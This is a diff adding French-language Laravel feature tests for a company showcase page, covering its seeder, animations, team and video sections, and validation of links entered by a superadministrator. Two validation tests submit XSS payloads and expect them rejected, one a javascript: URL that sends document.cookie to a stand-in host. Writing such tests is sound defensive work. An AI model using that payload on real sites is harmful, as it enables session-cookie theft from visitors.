@@ -234,6 +234,156 @@ class VitrineTest extends TestCase
         $this->assertSame('/inscription', VitrineCarte::first()->lien_url);
     }
 
+    // ══════════════ La page d'accueil, telle qu'elle se déroule ══════════════
+
+    public function test_le_semeur_pose_la_charpente_de_la_page(): void
+    {
+        $this->seed(\Database\Seeders\VitrineSeeder::class);
+
+        $page = $this->get(route('vitrine'))->assertOk();
+
+        // Les six applications que le propriétaire a nommées.
+        foreach (['Selflow', 'Comptaflow', 'RHFlow', 'LegalFlow', 'Agent-AI', 'CGA-Connect'] as $produit) {
+            $page->assertSee($produit, false);
+        }
+
+        $page->assertSee('Agnimel Meledje Abraham', false);
+        $page->assertSee('DC-Knowing', false);
+        $page->assertSee('Keyman Constant', false);
+    }
+
+    public function test_le_semeur_ne_reecrit_pas_ce_qui_a_ete_saisi(): void
+    {
+        // Il vit dans `DatabaseSeeder` : le relancer après une saisie doit
+        // laisser le travail du superadministrateur en place.
+        $this->seed(\Database\Seeders\VitrineSeeder::class);
+
+        $accueil = VitrineSection::where('cle', 'accueil')->firstOrFail();
+        $accueil->update(['titre' => 'Un titre écrit à la main']);
+
+        $this->seed(\Database\Seeders\VitrineSeeder::class);
+
+        $this->assertSame('Un titre écrit à la main', $accueil->fresh()->titre);
+        $this->assertSame(1, VitrineSection::where('cle', 'accueil')->count());
+    }
+
+    public function test_la_page_porte_ses_animations_et_le_respect_du_mouvement_reduit(): void
+    {
+        // Un mouvement qu'on n'a pas demandé provoque des vertiges chez une
+        // partie des visiteurs. Le système d'exploitation le dit ; la page
+        // doit l'écouter.
+        $this->uneSection(['gabarit' => 'colonnes']);
+
+        $this->get(route('vitrine'))
+            ->assertOk()
+            ->assertSee('prefers-reduced-motion', false)
+            ->assertSee('IntersectionObserver', false)
+            ->assertSee('section-tete apparait', false);
+    }
+
+    public function test_un_gabarit_equipe_affiche_les_initiales_faute_de_photo(): void
+    {
+        // Les portraits ne sont pas encore déposés : deux lettres valent mieux
+        // qu'une case grise.
+        $section = $this->uneSection(['cle' => 'equipe', 'gabarit' => 'equipe', 'titre' => 'L\'équipe']);
+        VitrineCarte::create([
+            'section_id' => $section->id, 'titre' => 'Agnimel Meledje Abraham',
+            'role' => 'Informaticien développeur', 'ordre' => 10, 'publiee' => true,
+        ]);
+
+        $this->get(route('vitrine'))
+            ->assertOk()
+            ->assertSee('portrait-vide', false)
+            ->assertSee('>AA<', false)
+            ->assertSee('Informaticien développeur', false);
+    }
+
+    public function test_une_section_video_pose_une_lecture_muette(): void
+    {
+        // `muted` est ce qui permet la lecture automatique : sans lui, le
+        // navigateur la refuse et la section reste figée.
+        $this->uneSection([
+            'cle' => 'parcours', 'gabarit' => 'media',
+            'media_type' => 'video', 'media_url' => 'https://exemple.test/demo.mp4',
+        ]);
+
+        $this->get(route('vitrine'))
+            ->assertOk()
+            ->assertSee('<video src="https://exemple.test/demo.mp4" autoplay muted loop', false);
+    }
+
+    public function test_une_section_media_sans_fichier_le_dit(): void
+    {
+        $this->uneSection(['cle' => 'parcours', 'gabarit' => 'media', 'media_type' => 'video']);
+
+        $this->get(route('vitrine'))
+            ->assertOk()
+            ->assertSee('n\'a pas encore été déposée', false);
+    }
+
+    public function test_le_fond_choisi_arrive_sur_la_section(): void
+    {
+        $this->uneSection(['cle' => 'cabinet', 'fond' => 'sombre']);
+
+        $this->get(route('vitrine'))->assertOk()->assertSee('section fond-sombre', false);
+    }
+
+    public function test_un_fond_inconnu_ne_fait_pas_tomber_la_page(): void
+    {
+        $this->uneSection(['cle' => 'cabinet', 'fond' => 'arc-en-ciel']);
+
+        $this->get(route('vitrine'))->assertOk()->assertSee('section fond-clair', false);
+    }
+
+    // ══════════════ Ce qu'on refuse d'afficher, suite ══════════════
+
+    public function test_un_media_javascript_est_refuse(): void
+    {
+        $section = $this->uneSection();
+
+        $this->actingAs($this->superadmin)
+            ->put(route('superadmin.vitrine.sections.modifier', $section), [
+                'titre'     => 'Section piégée',
+                'gabarit'   => 'media',
+                'ordre'     => 10,
+                'media_url' => 'javascript:fetch("https://ailleurs.example/?c="+document.cookie)',
+            ])
+            ->assertSessionHasErrors('media_url');
+    }
+
+    public function test_un_bouton_de_section_javascript_est_refuse(): void
+    {
+        $section = $this->uneSection();
+
+        $this->actingAs($this->superadmin)
+            ->put(route('superadmin.vitrine.sections.modifier', $section), [
+                'titre'          => 'Section piégée',
+                'gabarit'        => 'colonnes',
+                'ordre'          => 10,
+                'action_libelle' => 'Cliquez ici',
+                'action_url'     => 'javascript:alert(1)',
+            ])
+            ->assertSessionHasErrors('action_url');
+    }
+
+    public function test_une_ancre_reste_acceptee_comme_lien(): void
+    {
+        // La page renvoie d'une section à l'autre : `#produits` doit passer.
+        $section = $this->uneSection();
+
+        $this->actingAs($this->superadmin)
+            ->put(route('superadmin.vitrine.sections.modifier', $section), [
+                'titre'          => 'Bandeau',
+                'gabarit'        => 'bandeau',
+                'ordre'          => 10,
+                'action_libelle' => 'Voir les produits',
+                'action_url'     => '#produits',
+            ])
+            ->assertSessionDoesntHaveErrors();
+
+        $this->assertSame('#produits', $section->fresh()->action_url);
+    }
+
     // ══════════════ Qui peut écrire ══════════════
 
     public function test_un_visiteur_ne_touche_pas_a_la_vitrine(): void
